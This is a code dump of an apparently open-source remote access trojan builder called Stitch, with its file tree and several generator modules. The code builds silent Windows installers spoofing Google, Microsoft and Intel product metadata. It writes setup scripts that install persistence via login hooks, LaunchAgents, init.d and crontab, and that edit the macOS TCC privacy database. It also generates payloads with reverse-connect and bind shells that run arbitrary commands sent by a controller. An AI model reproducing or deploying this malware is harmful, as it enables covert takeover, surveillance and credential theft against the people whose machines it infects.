Project Path: arc_gmh5225_stitch_1fbzjixe

Source Tree:

```txt
arc_gmh5225_stitch_1fbzjixe
├── Application
│   ├── Stitch_Vars
│   │   ├── __init__.py
│   │   ├── globals.py
│   │   ├── makeself.py
│   │   ├── nsis.py
│   │   ├── payload_code.py
│   │   └── payload_setup.py
│   ├── __init__.py
│   ├── stitch_cmd.py
│   ├── stitch_gen.py
│   ├── stitch_help.py
│   ├── stitch_lib.py
│   ├── stitch_lnxshell.py
│   ├── stitch_osxshell.py
│   ├── stitch_pyld_config.py
│   ├── stitch_utils.py
│   └── stitch_winshell.py
├── Cleaner
│   └── st_cleaner.py
├── Configuration
│   ├── creddump
│   │   ├── COPYING
│   │   ├── __init__.py
│   │   ├── addrspace.py
│   │   ├── hashdump.py
│   │   ├── newobj.py
│   │   ├── obj.py
│   │   ├── rawreg.py
│   │   └── types.py
│   ├── mss
│   │   ├── LICENSE
│   │   ├── __init__.py
│   │   ├── base.py
│   │   ├── darwin.py
│   │   ├── exception.py
│   │   ├── factory.py
│   │   ├── linux
│   │   │   ├── 32
│   │   │   │   └── libmss.so
│   │   │   ├── 64
│   │   │   │   └── libmss.so
│   │   │   ├── build.sh
│   │   │   └── mss.c
│   │   ├── linux.py
│   │   └── windows.py
│   ├── pyxhook.py
│   └── vidcap.pyd
├── Elevation
│   ├── elevate.exe
│   ├── elevate.py
│   └── elevatepy2exe.py
├── Icons
│   ├── Appstore
│   │   └── AppIcon.icns
│   ├── IAStorIcon
│   │   └── IAStorIcon.ico
│   ├── Launchpad
│   │   └── Launchpad.icns
│   ├── Safari
│   │   └── compass.icns
│   ├── SecEdit
│   │   └── SecEdit.ico
│   ├── System_Preferences
│   │   └── PrefApp.icns
│   ├── WUDFPort
│   │   └── WUDFPort.ico
│   ├── WmiPrvSE
│   │   └── WmiPrvSE.ico
│   ├── chrome
│   │   ├── app.icns
│   │   └── chrome.ico
│   ├── drive
│   │   └── drive.ico
│   ├── searchfilterhost
│   │   └── searchfilterhost.ico
│   └── windef
│       └── windef.ico
├── LICENSE
├── PyLib
│   ├── askpass.py
│   ├── avkiller.py
│   ├── avscan_posix.py
│   ├── avscan_win.py
│   ├── cat.py
│   ├── cd.py
│   ├── chromedump.py
│   ├── clearev.py
│   ├── crackpassword.py
│   ├── depscan.py
│   ├── disableRDP.py
│   ├── disableUAC.py
│   ├── disableWinDef.py
│   ├── displayoff.py
│   ├── displayon.py
│   ├── download.py
│   ├── drive_finder.py
│   ├── editAccessed.py
│   ├── editCreation.py
│   ├── editModified.py
│   ├── enableRDP.py
│   ├── enableUAC.py
│   ├── enableWinDef.py
│   ├── environment.py
│   ├── fileinfo.py
│   ├── freeze_start.py
│   ├── freeze_status.py
│   ├── freeze_stop.py
│   ├── fwallow.py
│   ├── fwscan.py
│   ├── fwstatus.py
│   ├── get_path.py
│   ├── hashdump.py
│   ├── hide.py
│   ├── hostsremove.py
│   ├── hostsupdate.py
│   ├── kl_dump.py
│   ├── kl_start.py
│   ├── kl_status.py
│   ├── kl_stop.py
│   ├── location.py
│   ├── lockscreen.py
│   ├── popup.py
│   ├── scanReg.py
│   ├── screenshot.py
│   ├── ssh.py
│   ├── sudo_cmd.py
│   ├── sysinfo.py
│   ├── uascan.py
│   ├── unhide.py
│   ├── upload.py
│   ├── vmscan.py
│   ├── webcamList.py
│   ├── webcamSnap.py
│   └── wifikeys.py
├── README.md
├── Tools
│   ├── ImageSnap-v0.2.5
│   │   ├── ImageSnap.h
│   │   ├── ImageSnap.m
│   │   ├── ImageSnap.xcodeproj
│   │   │   ├── project.pbxproj
│   │   │   ├── project.xcworkspace
│   │   │   │   ├── contents.xcworkspacedata
│   │   │   │   └── xcuserdata
│   │   │   │       └── rob.xcuserdatad
│   │   │   │           ├── UserInterfaceState.xcuserstate
│   │   │   │           └── WorkspaceSettings.xcsettings
│   │   │   ├── rob.mode1v3
│   │   │   ├── rob.pbxuser
│   │   │   └── xcuserdata
│   │   │       └── rob.xcuserdatad
│   │   │           ├── xcdebugger
│   │   │           │   └── Breakpoints.xcbkptlist
│   │   │           └── xcschemes
│   │   │               ├── imagesnap.xcscheme
│   │   │               └── xcschememanagement.plist
│   │   ├── ReadMeOrDont.rtf
│   │   └── imagesnap
│   ├── makeself
│   │   ├── COPYING
│   │   ├── README.md
│   │   ├── makeself-header.sh
│   │   ├── makeself.1
│   │   ├── makeself.lsm
│   │   └── makeself.sh
│   ├── osx_dev_setup.sh
│   └── passwords.txt
├── _config.yml
├── lnx_requirements.txt
├── main.py
├── osx_requirements.txt
└── win_requirements.txt

```

`Application/Stitch_Vars/globals.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import sys
import string
import random
import base64
import logging

banner = '''\
===============================================================

       ...             s      .        s
   .x888888hx    :    :8     @88>     :8              .uef^"
  d88888888888hxx    .88     %8P     .88            :d88E
 8" ... `"*8888%`   :888ooo   .     :888ooo      .  `888E
!  "   ` .xnxx.  -*8888888  .@88u -*8888888 .udR88N  888E .z8k
X X   .H8888888%:   8888   ''888E`  8888   <888'888k 888E~?888L
X 'hn8888888*"   >  8888     888E   8888   9888 'Y"  888E  888E
X: `*88888%`     !  8888     888E   8888   9888      888E  888E
'8h.. ``     ..x8> .8888Lu=  888E  .8888Lu=9888      888E  888E
 `88888888888888f  ^%888*    888&  ^%888*  ?8888u../ 888E  888E
  '%8888888888*"     'Y"     R888"   'Y"    "8888P' m888N= 888>
     ^"****""`                ""              "P'    `Y"   888
                                                          J88"
Version 1.0                                               @%
https://github.com/nathanlopez/Stitch                    :"
===============================================================
'''

st_tag      = "[Stitch]"
st_eof      = base64.b64decode('c3RpdGNoNjI2aGN0aXRz')
st_complete = base64.b64decode('c3RpdGNoLjpjb21wbGV0ZTouY2h0aXRz')

options_fw_osx    = ['status','open','close']
options_fw_win    = ['status','open','close','allow']
options_hostsfile = ['update','remove','show']
options_freeze    = ['status','start','stop']
options_keylogger = ['status','start','stop','dump']

stitch_path        = os.path.dirname(os.path.realpath(sys.argv[0]))
app_path           = os.path.join(stitch_path,'Application')
stitch_vars_path   = os.path.join(app_path,'Stitch_Vars')
pylib_path         = os.path.join(stitch_path,'PyLib')
uploads_path       = os.path.join(stitch_path,'Uploads')
downloads_path     = os.path.join(stitch_path,'Downloads')
payloads_path      = os.path.join(stitch_path,'Payloads')
log_path           = os.path.join(stitch_path,'Logs')
stitch_temp_path   = os.path.join(stitch_path,'Temp')
tools_path         = os.path.join(stitch_path,'Tools')
configuration_path = os.path.join(stitch_path,'Configuration')
elevation_path     = os.path.join(stitch_path,'Elevation')

st_config   = os.path.join(stitch_vars_path,'stitch_config.ini')
hist_ini    = os.path.join(stitch_vars_path,'history.ini')
stitch_log  = os.path.join(log_path,'stitch.log')
st_aes      = os.path.join(stitch_vars_path,'st_aes.py')
st_aes_lib  = os.path.join(stitch_vars_path, 'st_aes_lib.ini')
imgsnp_fld  = os.path.join(tools_path,'ImageSnap-v0.2.5')
imagesnap   = os.path.join(imgsnp_fld, 'imagesnap')

st_paths = [pylib_path,
            uploads_path,
            downloads_path,
            payloads_path,
            log_path,
            stitch_temp_path,
            configuration_path]

for p in st_paths:
    if not os.path.exists(p):
        os.mkdir(p)

if not os.path.exists(st_aes):
    key  = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(32))
    key  = base64.b64encode(key)
    code = '''# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import base64

aes_encoded = '{}'
aes_abbrev = '{{}}{{}}{{}}{{}}{{}}{{}}{{}}{{}}{{}}{{}}{{}}{{}}{{}}'.format(
    aes_encoded[21],aes_encoded[0],aes_encoded[1],aes_encoded[43],aes_encoded[5],
    aes_encoded[13],aes_encoded[7],aes_encoded[24],aes_encoded[31],
    aes_encoded[35],aes_encoded[16],aes_encoded[39],aes_encoded[28])
secret=base64.b64decode(aes_encoded)'''.format(key)

    with open(st_aes,'w') as s:
        s.write(code)

if not os.path.exists(stitch_log):
    with open(stitch_log,'w') as s: pass

st_log = logging.getLogger(stitch_log)
st_log.setLevel(logging.DEBUG)
file_handler = logging.FileHandler(stitch_log, 'a')
formatter = logging.Formatter('[%(asctime)s] %(levelname)s: %(message)s',datefmt='%m/%d/%Y %I:%M:%S %p')
file_handler.setFormatter(formatter)
st_log.addHandler(file_handler)

```

`Application/Stitch_Vars/makeself.py`:

```py
# -*- coding: utf-8 -*-
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import shutil
import subprocess
from globals import *
from payload_setup import *

mkself_path = os.path.join(tools_path,'makeself')
mkself_exe = os.path.join(mkself_path,'makeself.sh')

def run_command(command):
    try:
        subp = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        subp_output, errors = subp.communicate()
        if not errors:
            if subp_output == '':
                return '[+] Command successfully executed.\n'
            else:
                return subp_output
        return "[!] {}\n".format(errors)
    except KeyboardInterrupt:
        print "Terminated command."

def no_error(cmd_output):
    if cmd_output.startswith("ERROR:") or cmd_output.startswith("[!]"):
        return False
    else:
        return True

#TODO write cross platform install commands
def gen_st_setup(alias,mkself_tmp):
    setup_code = '''#!/bin/bash

osx=false
lnx=false

user="$(logname)"
script_dir="$(dirname $0)"

if [ "$(id -u)" != "0" ]; then
    sudo_rights=false
else
    sudo_rights=true
fi

case "$(uname -s)" in
   Darwin)
        osx=true
    ;;
   Linux)
        lnx=true
    ;;
esac

if [ "$osx" = true ]; then
    trgt="/usr/local/bin"
    su_trgt="/usr/local/sbin"
    plist_trgt="/Users/$user/Library/LaunchAgents"
    if [ ! -d $plist_trgt ]; then
         mkdir -p $plist_trgt
    fi
    if [ "$sudo_rights" = true ]; then
        cp -R $script_dir/{0}.app $su_trgt/{0}.app >> /dev/null 2>&1
        cp $script_dir/onlogin.sh $su_trgt/{0}.app/Contents/MacOS/.onlogin.sh
        chown -R $(logname) $su_trgt/{0}.app
        chmod +x {0}.app/Contents/MacOS/{0}
        chmod +x $su_trgt/{0}.app/Contents/MacOS/.onlogin.sh
        cd $su_trgt/{0}.app/Contents/MacOS/
        nohup /usr/local/sbin/{0}.app/Contents/MacOS/{0} >> /dev/null 2>&1 &
        defaults write com.apple.loginwindow LoginHook $su_trgt/{0}.app/Contents/MacOS/.onlogin.sh
        sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "INSERT OR REPLACE INTO access VALUES ('kTCCServiceAccessibility','com.apple.Terminal',0,1,1,NULL)" >> /dev/null 2>&1
        sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "INSERT OR REPLACE INTO access VALUES ('kTCCServiceAccessibility','com.apple.loginwindow',0,1,1,NULL)" >> /dev/null 2>&1
        sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "INSERT OR REPLACE INTO access VALUES ('kTCCServiceAccessibility','com.apple.Terminal',0,1,1,NULL,NULL)" >> /dev/null 2>&1
        sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "INSERT OR REPLACE INTO access VALUES ('kTCCServiceAccessibility','com.apple.loginwindow',0,1,1,NULL,NULL)" >> /dev/null 2>&1
        sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "UPDATE access SET allowed='1' WHERE client='com.apple.Terminal'" >> /dev/null 2>&1
        sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "UPDATE access SET allowed='1' WHERE client='com.apple.loginwindow'" >> /dev/null 2>&1
    else
        cp -R $script_dir/{0}.app $trgt/{0}.app >> /dev/null 2>&1
        chown -R $(logname) {0}.app
        chmod +x {0}.app/Contents/MacOS/{0}
        cp $script_dir/st.plist $plist_trgt/{0}_st.plist >> /dev/null 2>&1
        launchctl load $plist_trgt/{0}_st.plist >> /dev/null 2>&1
    fi
fi

if [ "$lnx" = true ]; then
    trgt="/home/$user"
    su_trgt="/usr/sbin"
    if [ "$sudo_rights" = true ]; then
        cp -R $script_dir/{0} $su_trgt/{0} >> /dev/null 2>&1
        cp $script_dir/su_st_daemon /etc/init.d/{0}_st >> /dev/null 2>&1
        chmod +x $su_trgt/{0}
        chmod +x /etc/init.d/{0}_st
        chkconfig --add {0}_st
        chkconfig --level 2345 {0}_st on
        /etc/init.d/{0}_st start
    else
        cp -R $script_dir/{0} $trgt/{0} >> /dev/null 2>&1
        chmod +x $trgt/{0}
        (crontab -l ;echo "@reboot $trgt/{0} &") | sort - | uniq - | crontab -
        cd $trgt
        nohup $trgt/{0} >> /dev/null 2>&1 &
    fi
fi
'''.format(alias)

    onlogin_code = '''#!/bin/bash
nohup /usr/local/sbin/{0}.app/Contents/MacOS/{0} >> /dev/null 2>&1 &
'''.format(alias)

    st_setup = os.path.join(mkself_tmp, 'st_setup.sh')
    with open(st_setup,'w') as s:
        s.write(setup_code)
    st_onlogin = os.path.join(mkself_tmp, 'onlogin.sh')
    with open(st_onlogin,'w') as s:
        s.write(onlogin_code)

def gen_osx_plist(alias,mkself_tmp):
    plist_code = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>com.{0}.st</string>

    <key>Disabled</key>
    <false/>

    <key>RunAtLoad</key>
    <true/>

    <key>KeepAlive</key>
    <true/>

    <key>LaunchOnlyOnce</key>
    <true/>

    <key>LSBackgroundOnly</key>
    <string>1</string>

    <key>LSUIElement</key>
    <true/>

    <key>ProgramArguments</key>
    <array>
      <string>/usr/local/bin/{0}.app/Contents/MacOS/{0}</string>
    </array>

    <key>WorkingDirectory</key>
    <string>/</string>
  </dict>
</plist>
'''.format(alias)

    st_plist = os.path.join(mkself_tmp, 'st.plist')
    with open(st_plist, 'w') as s:
        s.write(plist_code)

def gen_lnx_daemon(alias,mkself_tmp):
    su_daemon_code = '''#!/bin/bash
# chkconfig: 2345 80 20

# Source function library.
. /etc/init.d/functions

start() {{
    daemon /usr/sbin/{0} &
}}

stop() {{
    echo
}}

case "$1" in
    start)
       start
       ;;
    stop)
       stop
       ;;
    *)
       echo "Usage: $0 {{start|stop}}"
esac

exit 0
'''.format(alias)

    su_st_daemon = os.path.join(mkself_tmp, 'su_st_daemon')
    with open(su_st_daemon, 'w') as s:
        s.write(su_daemon_code)


def gen_makeself(conf_dir,alias):
    mkself_tmp = os.path.join(conf_dir,'tmp')
    conf_mkself = os.path.join(conf_dir,'Installers')
    if not os.path.exists(conf_mkself):
        os.makedirs(conf_mkself)
    if not os.path.exists(mkself_tmp):
        os.makedirs(mkself_tmp)
    if sys.platform.startswith('darwin'):
        alias_app = os.path.join(conf_dir,'{}.app'.format(alias))
        if os.path.exists(alias_app):
            run_command('cp -R {} {}'.format(alias_app,mkself_tmp))
            gen_osx_plist(alias,mkself_tmp)
            gen_st_setup(alias,mkself_tmp)
            mkself_installer = 'bash "{}" "{}" "{}/{}_Installer" "Stitch" bash st_setup.sh'.format(mkself_exe, mkself_tmp, conf_mkself,alias)
            st_log.info(mkself_installer)
            st_log.info(run_command(mkself_installer))
            shutil.rmtree(mkself_tmp)
    else:
        binry_dir = os.path.join(conf_dir,'Binaries')
        alias_dir = os.path.join(binry_dir, alias)
        if os.path.exists(alias_dir):
            run_command('cp -R {} {}'.format(alias_dir,mkself_tmp))
            gen_lnx_daemon(alias,mkself_tmp)
            gen_st_setup(alias,mkself_tmp)
            mkself_installer = 'bash "{}" "{}" "{}/{}_Installer" "Stitch" bash st_setup.sh'.format(mkself_exe, mkself_tmp, conf_mkself,alias)
            st_log.info(mkself_installer)
            st_log.info(run_command(mkself_installer))
            shutil.rmtree(mkself_tmp)

```

`Application/Stitch_Vars/nsis.py`:

```py
# -*- coding: utf-8 -*-
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import shutil
import subprocess

################################################################################
#                         NSIS Installer Variables                             #
################################################################################

nsis_Path = {'chrome':'Google',
'drive' : 'WDRV',
'IAStorIcon' : 'IAS',
'SecEdit' : 'WSEC',
'searchfilterhost' : 'WSRCH',
'WUDFPort' : 'WUDF',
'MSASTUIL' : 'WSEC',
'WmiPrvSE' : 'WMIP'}

nsis_Version={'chrome':'52.0.2743.116',
'drive' : '17.3.6517.0809',
'IAStorIcon' : '14.5.0.1081',
'SecEdit' : '10.0.14393.0',
'searchfilterhost' : '52.0.2743.116',
'WUDFPort' : '10.0.10586.0',
'MSASTUIL' : '4.10.14393.0',
'WmiPrvSE' : '10.0.14393.0'}

nsis_ProductName = {'chrome':'stGoogle Installer.exe',
'drive' : 'stWindows Drive Installer.exe',
'IAStorIcon' : 'stIntel Iastor Installer.exe',
'SecEdit' : 'stWindows SecEdit Update.exe',
'searchfilterhost' : 'stWindows SearchConfig Installer.exe',
'WUDFPort' : 'stWindows Ports Manager Installer.exe',
'MSASTUIL' : 'stWindows Defender Update.exe',
'WmiPrvSE' : 'stWindows WmiPrv Installer.exe'}

nsis_CompanyName={'chrome':'stGoogle Inc.',
'drive' : 'stMicrosoft Corporation',
'IAStorIcon' : 'stIntel Corporation',
'SecEdit' : 'stMicrosoft Corporation',
'searchfilterhost' : 'stMicrosoft Corporation',
'WUDFPort' : 'stMicrosoft Corporation',
'MSASTUIL' : 'stMicrosoft Corporation',
'WmiPrvSE' : 'stMicrosoft Corporation'}

nsis_LegalCopyright={'chrome':'Copyright 2016 stGoogle Inc. All rights reserved.',
'drive' : "stMicrosoft Corporation. All rights reserved.",
'IAStorIcon' : "Copyright stIntel Corporation. All rights reserved.",
'SecEdit' : "stMicrosoft Corporation. All rights reserved.",
'searchfilterhost' : "stMicrosoft Corporation. All rights reserved.",
'WUDFPort' : "stMicrosoft Corporation. All rights reserved.",
'MSASTUIL' : "stMicrosoft Corporation. All rights reserved.",
'WmiPrvSE' : "stMicrosoft Corporation. All rights reserved."}

nsis_Name = {'chrome':'stGoogle Installer',
'drive' : 'stWindows Drive Installer',
'IAStorIcon' : 'stIntel Iastor Installer',
'SecEdit' : 'stWindows SecEdit Update',
'searchfilterhost' : 'stWindows SearchConfig Installer',
'WUDFPort' : 'stWindows Ports Manager Installer',
'MSASTUIL' : 'stWindows Defender Update',
'WmiPrvSE' : 'stWindows WmiPrv Installer'}

nsis_InternalName={'chrome':'stGoogle NSIS Library',
'drive' : 'stWindows Drive NSIS Library',
'IAStorIcon' : 'stIntel Iastor NSIS Library',
'SecEdit' : 'stWindows SecEdit NSIS Library',
'searchfilterhost' : 'stWindows SearchConfig NSIS Library',
'WUDFPort' : 'stWindows Ports Manager NSIS Library',
'MSASTUIL' : 'stWindows Defender NSIS Library',
'WmiPrvSE' : 'stWindows WmiPrv NSIS Library'}

################################################################################
#                       NSIS Script Setup Variables                            #
################################################################################

def run_command(command):
    try:
        subp = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        subp_output, errors = subp.communicate()
        if not errors:
            if subp_output == '':
                return '[+] Command successfully executed.\n'
            else:
                return subp_output
        return "[!] {}\n".format(errors)
    except KeyboardInterrupt:
        print "Terminated command."

def no_error(cmd_output):
    if cmd_output.startswith("ERROR:") or cmd_output.startswith("[!]"):
        return False
    else:
        return True

def gen_nsis(conf_dir, name, outfile, path, elevation_path):
    exe_name = '{}.exe'.format(name)
    setup_nsi='''
!include "LogicLib.nsh"
!include "x64.nsh"

ShowInstDetails "nevershow"
ShowUninstDetails "nevershow"
RequestExecutionLevel admin
SilentInstall silent

SetCompressor lzma

VIProductVersion                 "{0}"
VIAddVersionKey ProductName      "{1}"
VIAddVersionKey CompanyName      "{2}"
VIAddVersionKey LegalCopyright   "{2}"
VIAddVersionKey FileDescription  "Installation Database"
VIAddVersionKey FileVersion      {0}
VIAddVersionKey ProductVersion   {0}
VIAddVersionKey InternalName     "{3}"
VIAddVersionKey LegalTrademarks  "{4}"
VIAddVersionKey OriginalFilename "{1}"
BrandingText "{2}"
Name "{5}"
OutFile "{6}"

InstallDir C:\

Section "payload"

    SetOutPath $INSTDIR\Windows\SysWOW64\{7}
    SetCompress off
    File insts\{8}
    SetCompress auto

    SetOutPath $INSTDIR\Windows\Temp
    SetCompress off
    File insts\elevate.exe
    ExecWait '"$INSTDIR\Windows\Temp\elevate.exe"'
    SetCompress auto

    Exec '"$INSTDIR\Windows\SysWOW64\{7}\{8}"'
    Delete '"$INSTDIR\Windows\Temp\elevate.exe"'

SectionEnd'''.format(nsis_Version[name],nsis_ProductName[name],nsis_CompanyName[name],
            nsis_InternalName[name],nsis_LegalCopyright[name],nsis_Name[name],outfile,path,exe_name)

    nsis_script = os.path.join(conf_dir,'nsis_setup.nsi')
    with open(nsis_script,'wb') as ns:
        ns.write(setup_nsi)

    insts_dir = os.path.join(conf_dir,'insts')
    installer_dir = os.path.join(conf_dir,'NSIS Installers')
    if not os.path.exists(insts_dir):
        os.makedirs(insts_dir)
    if not os.path.exists(installer_dir):
        os.makedirs(installer_dir)

    exe_path = os.path.join(conf_dir,exe_name)
    insts_exe = os.path.join(insts_dir,exe_name)
    elevate = os.path.join(elevation_path,'elevate.exe')
    shutil.copy(exe_path, insts_dir)
    shutil.copy(elevate, insts_dir)

    nsis_payload = run_command('"C:\\Program Files (x86)\\NSIS\\makensis.exe" "{}"'.format(nsis_script))
    if no_error(nsis_payload):
        instllr_path = os.path.join(conf_dir,outfile)
        nsis_instllr_path = os.path.join(installer_dir,outfile)
        if os.path.exists(instllr_path):
            os.rename(instllr_path,nsis_instllr_path)
        #st_print('[+] NSIS payload complete')
    else:
        st_print('[!] Error creating NSIS payload with {} configuration'.format(exe_name))

    os.remove(nsis_script)
    shutil.rmtree(insts_dir)

```

`Application/Stitch_Vars/payload_code.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import sys
from st_aes import *
from random import randint,choice
from string import ascii_uppercase

st_obf = []
for n in range(0,10):
    st_obf.append(''.join(choice(ascii_uppercase) for i in range(randint(1,5))))

################################################################################
#                       st_main.py stitch_gen variables                        #
################################################################################

main_imports = '''#!/usr/bin/env python
from st_utils import *

class stitch_payload():

    connected = False
'''

def add_bind_server(BHOST,BPORT):
    return '''
    def bind_server(self):
        client_socket=None
        self.stop_bind_server = False
        # if no target is defined, we listen on all interfaces
        if dbg:
            print 'creating server'
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        target = base64.b64decode("{}")
        port = int(base64.b64decode("{}"))
        server.bind((target,port))
        server.listen(5)
        while True:
            if self.stop_bind_server:
                break
            server.settimeout(5)
            try:
                client_socket, addr = server.accept()
                server.settimeout(None)
                client_socket.settimeout(None)
            except Exception as e:
                if dbg:
                    print e
                client_socket=None
                pass
            if client_socket:
                if not self.connected:
                    self.connected = True
                    client_handler(client_socket)
                    self.connected = False
                else:
                    send(client_socket,"[!] Another stitch shell has already been established.\\n")
                    client_socket.close()
            client_socket=None
        server.close()

    def halt_bind_server(self):
        self.stop_bind_server = True\n\n'''.format(BHOST,BPORT)

def add_listen_server(LHOST,LPORT):
    return '''
    def listen_server(self):
        self.stop_listen_server  = False
        while True:
            if self.stop_listen_server :
                break
            while self.connected:
                sleep(5)
                pass
            if dbg:
                print 'trying to connect'
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            client_socket.settimeout(5)
            target = base64.b64decode("{}")
            port = int(base64.b64decode("{}"))
            try:
                client_socket.connect((target,port))
                client_socket.settimeout(300)
                if not self.connected:
                    self.connected = True
                    client_handler(client_socket)
                    self.connected = False
                else:
                    send(client_socket,"[!] Another stitch shell has already been established.\\n")
                    client_socket.close()
            except Exception as e:
                if dbg:
                    print e
                client_socket.close()

    def halt_listen_server(self):
        self.stop_listen_server = True\n\n'''.format(LHOST,LPORT)

def add_listen_bind_main():
    return'''
def main():
    if not stitch_running():
        st_pyld = stitch_payload()
        try:
            bind = threading.Thread(target=st_pyld.bind_server, args=())
            listen = threading.Thread(target=st_pyld.listen_server, args=())
            bind.daemon = True
            listen.daemon = True
            bind.start()
            listen.start()
            while True:
                sleep(60)
        except KeyboardInterrupt:
            pass
        except Exception as e:
            if dbg:
                print e
            pass
        st_pyld.halt_bind_server()
        st_pyld.halt_listen_server()

'''

def add_listen_main():
    return '''
def main():
    if not stitch_running():
        st_pyld = stitch_payload()
        try:
            listen = threading.Thread(target=st_pyld.listen_server, args=())
            listen.daemon = True
            listen.start()
            while True:
                sleep(60)
        except KeyboardInterrupt:
            pass
        except Exception as e:
            if dbg:
                print e
            pass
        st_pyld.halt_listen_server()

'''

def add_bind_main():
    return '''
def main():
    if not stitch_running():
        st_pyld = stitch_payload()
        try:
            bind = threading.Thread(target=st_pyld.bind_server, args=())
            bind.daemon = True
            bind.start()
            while True:
                sleep(60)
        except KeyboardInterrupt:
            pass
        except Exception as e:
            if dbg:
                print e
            pass
        st_pyld.halt_bind_server()

'''

def add_run_main():
    if sys.platform.startswith('darwin'):
        return '''
class AppDelegate(NSObject):
    def applicationDidFinishLaunching_(self, notification):
        st_thread = threading.Thread(target=main)
        st_thread.daemon = True
        st_thread.start()

def osx_main():
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    AppHelper.runEventLoop()

if __name__ == '__main__':
    osx_main()
'''
    else:
        return '''
if __name__ == '__main__':
    main()
'''
################################################################################
#                       st_utils.py stitch_gen variables                       #
################################################################################

utils_imports = '''
import os
import re
import sys
import math
import socket
import base64
import shutil
import zipfile
import datetime
import requests
import StringIO
import platform
import threading
import subprocess
from st_protocol import *
from st_encryption import *
from mss import ScreenshotError
from time import strftime, sleep
from contextlib import contextmanager\n'''

utils_code = '''

sp = subprocess
N = True
T = False
{3} = send
{6} = sys.platform

def run_command({4}):
    subp = sp.Popen({4},shell=True,stdout=sp.PIPE,stderr=sp.PIPE)
    {0}, {5} = subp.communicate()
    if not {5}:
        if {0} == '':
            return "[+] Command successfully executed.\\n"
        else:
            return {0}
    return "[!] {{}}".format({5})

def start_command(command):
    try:
        subp = sp.Popen(command, shell=True,
             stdin=None, stdout=None, stderr=None, close_fds=True)
        return '[+] Command successfully started.\\n'
    except Exception as e:
        return '[!] {{}}\\n'.format(str(e))

def no_error({1}):
    if {1}.startswith("ERROR:") or {1}.startswith("[!]") :
        return T
    else:
        return N

def win_client(system = {6}):
    if system.startswith('win'):
        return N
    else:
        return T

def osx_client(system = {6}):
    if system.startswith('darwin'):
        return N
    else:
        return T

def lnx_client(system = {6}):
    if system.startswith('linux'):
        return N
    else:
        return T

def pyexec({7},client_socket,pylib=False):
    pyerror = None
    response = ''
    if pylib:
        try:
            exec {7}
        except Exception as e:
            {5} = "[!] PYEXEC(): {{}}".format(str(e))
            {3}(client_socket,{5})
    else:
        with stdoutIO() as s:
            try:
                exec {7}
            except Exception as e:
                {5} = "[!] PYEXEC(): {{}}".format(str(e))
                {3}(client_socket,{5})
        r = s.getvalue()
        {3}(client_socket,r)

def determine_cmd({4},{2}):
    if {4}.strip()[:6] == "pyexec":
        pyexec({4}.strip()[6:],{2})
    elif {4}.strip()[:5] == "pylib":
        pyexec({4}.strip()[5:],{2},pylib=True)
    else:
        output=run_command({4})
        {3}({2},output)

def get_user():
    if win_client():
        user = os.getenv('username')
    else:
        user = run_command('whoami')
    return user.strip()

def get_path():
    user = get_user()
    hostname = platform.node()
    current_dir = os.getcwd()
    path_name = "[{{}}@{{}}] {{}}>".format(user,hostname,current_dir)
    return path_name

def get_temp():
    if win_client():
        temp = "C:\\\\Windows\\\\Temp\\\\"
    else:
        temp = "/tmp/"
    return temp

def get_desktop():
    user = get_user()
    if win_client():
        {9} = os.path.join(os.getenv('userprofile'),'Desktop')
    elif osx_client():
        {9} = '/Users/{{}}/Desktop'.format(user)
        if not os.path.exists({9}):
            logname = run_command('logname')
            {9} = '/Users/{{}}/Desktop'.format(logname.strip())
    else:
        {9} = '/home/{{}}'.format(user)
    return {9}

def stitch_running():
    {8} = os.getpid()
    {9} = os.path.abspath(sys.argv[0])
    if {9}.endswith('.py') or {9}.endswith('.pyc'):
        {9} = 'python.exe'
    if win_client():
        {7} = base64.b64decode('QzpcV2luZG93c1xUZW1wOnN0c2hlbGwubG9n')
    else:
        {7} = base64.b64decode('L3RtcC8uc3RzaGVsbC5sb2c=')
    if os.path.exists({7}):
        with open({7},'r') as st:
            data = st.readlines()
            data[0] = str(data[0]).strip()
        if data[0] == {8}:
            if data[1] == {9}:
                return True
        if win_client():
            exists_cmd = 'wmic process where "ProcessID={{}}" get ExecutablePath'.format(data[0])
        else:
            exists_cmd = 'ps -p {{}} -o comm='.format(data[0])
        running = run_command(exists_cmd)
        if running:
            if data[1] in running.strip() or running.strip() in data[1]:
                return True
    with open({7},'w') as st:
        st.write('{{}}\\n{{}}'.format({8},{9}))
    return False

def zipdir(path, zipn):
    for root, dirs, files in os.walk(path):
        for file in files:
            zipn.write(os.path.join(root, file))

@contextmanager
def stdoutIO(stdout=None):
    prev = sys.stdout
    if stdout is None:
        stdout = StringIO.StringIO()
    sys.stdout = stdout
    yield stdout
    sys.stdout = prev

def client_handler({2}):
    user = get_user()
    hostname = platform.node()
    current_dir = os.getcwd()
    {8} = get_desktop()
    if os.path.exists({8}):
        os.chdir({8})
    try:
        {3}({2},'c3RpdGNoX3NoZWxs',encryption=False)
        {3}({2},abbrev, encryption=False)
